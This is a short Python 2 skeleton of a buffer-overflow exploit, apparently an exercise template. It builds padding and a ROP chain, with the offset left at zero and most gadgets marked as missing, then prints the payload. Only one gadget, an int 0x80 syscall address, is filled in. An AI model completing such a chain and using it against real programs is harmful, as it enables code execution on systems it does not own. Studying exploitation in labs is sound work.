#!/usr/bin/env python

from struct import pack

padding = 0 # find offset to overflow
junk = "A" * padding

## ROP gadgets ##
p = ''
# add the missing gadgets...
p += pack('<I', 0x080494a1) # int 0x80

payload = junk + p
print payload
